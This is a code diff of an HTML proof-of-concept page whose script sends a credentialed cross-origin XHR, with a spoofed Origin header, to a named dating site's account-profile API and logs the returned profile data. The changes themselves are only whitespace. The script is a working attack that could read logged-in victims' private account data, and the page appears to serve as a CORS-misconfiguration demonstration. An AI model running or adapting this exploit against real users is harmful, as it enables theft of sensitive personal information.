@@ -11,14 +11,14 @@
         xhr.open("GET", "https://api.ashleymadison.com/v2/account/profile/", true);
         xhr.setRequestHeader("accept", "application/json, text/plain, */*");
         xhr.setRequestHeader("accept-language", "en-GB,en-US;q=0.9,en;q=0.8");
-	xhr.setRequestHeader("Origin", "https://www.github.com/");
+	    xhr.setRequestHeader("Origin", "https://www.github.com/");
         xhr.withCredentials = true;
         var body = "";
         var aBody = new Uint8Array(body.length);
         for (var i = 0; i < aBody.length; i++)
           aBody[i] = body.charCodeAt(i); 
-        xhr.send(new Blob([aBody]));
-        xhr.onreadystatechange = function() {
+          xhr.send(new Blob([aBody]));
+          xhr.onreadystatechange = function() {
     	    if (xhr.readyState === 4) {
       	    console.log(xhr.response);
     	  }
@@ -30,4 +30,3 @@
     </form>
   </body>
 </html>
-
